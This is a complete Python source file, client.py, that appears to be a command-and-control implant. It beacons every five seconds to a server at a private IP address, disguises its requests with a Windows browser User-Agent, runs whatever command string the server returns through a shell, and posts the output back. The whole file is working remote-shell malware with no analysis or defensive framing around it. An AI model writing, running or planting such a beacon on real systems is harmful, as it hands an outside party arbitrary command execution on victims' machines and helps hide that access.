# client.py
import time
import requests
import subprocess
import uuid
import socket

SERVER_URL = "http://10.0.1.33:8000"
SLEEP_TIME = 5
SESSION_ID = str(uuid.uuid4())

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Session-ID": SESSION_ID
}

def get_command():
    try:
        r = requests.get(f"{SERVER_URL}/stage", headers=headers)
        return r.text.strip() if r.status_code == 200 else ""
    except:
        return ""

def send_result(output):
    try:
        requests.post(f"{SERVER_URL}/result", headers=headers, data={"result": output})
    except:
        pass

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode() if e.output else "[!] Error running command."

if __name__ == "__main__":
    while True:
        cmd = get_command()
        if cmd:
            if cmd.lower() == "exit":
                break
            result = execute_command(cmd)
            send_result(result)
        time.sleep(SLEEP_TIME)
